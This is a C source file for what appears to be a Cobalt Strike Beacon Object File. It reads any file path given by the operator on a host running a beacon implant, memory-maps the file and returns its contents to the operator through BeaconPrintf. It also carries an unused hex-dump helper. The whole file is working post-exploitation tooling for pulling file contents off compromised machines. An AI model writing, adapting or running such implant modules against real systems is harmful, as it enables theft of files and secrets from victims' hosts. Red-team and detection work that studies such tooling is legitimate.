#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include "beacon.h"

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(
  LPCSTR                lpFileName,
  DWORD                 dwDesiredAccess,
  DWORD                 dwShareMode,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  DWORD                 dwCreationDisposition,
  DWORD                 dwFlagsAndAttributes,
  HANDLE                hTemplateFile
);

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileMappingA(
  HANDLE                hFile,
  LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
  DWORD                 flProtect,
  DWORD                 dwMaximumSizeHigh,
  DWORD                 dwMaximumSizeLow,
  LPCSTR                lpName
);

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$MapViewOfFile(
  HANDLE hFileMappingObject,
  DWORD  dwDesiredAccess,
  DWORD  dwFileOffsetHigh,
  DWORD  dwFileOffsetLow,
  SIZE_T dwNumberOfBytesToMap
);


DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetFileSize(
  HANDLE  hFile,
  LPDWORD lpFileSizeHigh
);

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$UnmapViewOfFile(
  LPCVOID lpBaseAddress
);

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(
  HANDLE hObject
);

// https://gist.github.com/ccbrown/9722406
void DumpHex(const void* data, size_t size) {
	char ascii[17];
	size_t i, j;
	ascii[16] = '\0';
	for (i = 0; i < size; ++i) {
		BeaconPrintf(CALLBACK_OUTPUT,"%02X ", ((unsigned char*)data)[i]);
		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
			ascii[i % 16] = ((unsigned char*)data)[i];
		} else {
			ascii[i % 16] = '.';
		}
		if ((i+1) % 8 == 0 || i+1 == size) {
			BeaconPrintf(CALLBACK_OUTPUT," ");
			if ((i+1) % 16 == 0) {
				BeaconPrintf(CALLBACK_OUTPUT,"|  %s \n", ascii);
			} else if (i+1 == size) {
				ascii[(i+1) % 16] = '\0';
				if ((i+1) % 16 <= 8) {
					BeaconPrintf(CALLBACK_OUTPUT," ");
				}
				for (j = (i+1) % 16; j < 16; ++j) {
					BeaconPrintf(CALLBACK_OUTPUT,"   ");
				}
				BeaconPrintf(CALLBACK_OUTPUT,"|  %s \n", ascii);
			}
		}
	}
}

void go(char *args, int len) {
    
    CHAR *file;
    datap parser;
    HANDLE hFile;
    BeaconDataParse(&parser, args, len);
    file = BeaconDataExtract(&parser, NULL);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Opening handle to file");

    hFile = KERNEL32$CreateFileA(file,    
        GENERIC_READ,
        FILE_SHARE_READ,              
        NULL,           
        OPEN_EXISTING,  
        0x00100000,              
        NULL);          

    if (hFile == INVALID_HANDLE_VALUE)
    {        
        BeaconPrintf(CALLBACK_ERROR, "Failed to open handle to file");
        BeaconPrintf(CALLBACK_ERROR, "Last error: 0x%X", KERNEL32$GetLastError());

        return;
    }
    
    DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] File size: %d bytes", fileSize);

    HANDLE hMapping = KERNEL32$CreateFileMappingA(hFile, 0, PAGE_READONLY, 0, 0 ,0);
    BYTE* fileBytes = KERNEL32$MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    //DumpHex(fileBytes, fileSize);
    
    BeaconPrintf(CALLBACK_OUTPUT, "%s", fileBytes);

    KERNEL32$UnmapViewOfFile(fileBytes);
    KERNEL32$CloseHandle(hMapping);
    KERNEL32$CloseHandle(hFile);

}